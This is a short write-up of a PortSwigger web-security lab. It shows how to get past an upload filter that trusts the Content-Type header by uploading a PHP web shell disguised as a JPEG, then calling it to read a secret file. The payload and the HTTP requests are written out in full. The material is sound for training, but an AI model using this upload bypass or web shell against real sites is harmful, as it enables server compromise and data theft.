# Web shell upload via Content-Type restriction bypass

**Lab Url**: [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

## Objective

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The avatar upload function checks the `Content-Type` header to validate file types. We can upload a PHP script by keeping the `Content-Type` set to a valid image MIME type.

### Step 1: Upload a PHP web shell

Upload a file named `exploit.php` via the avatar upload form. Ensure the `Content-Type` header is set to `image/jpeg` (or `image/png`) to bypass the MIME check:

```http
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The application accepts the file and stores it in `/files/avatars/`.

### Step 2: Retrieve the secret

Visit the uploaded shell:

```http
GET /files/avatars/exploit.php
```

The PHP script executes and returns the contents of `/home/carlos/secret`. Submit this secret to solve the lab.
 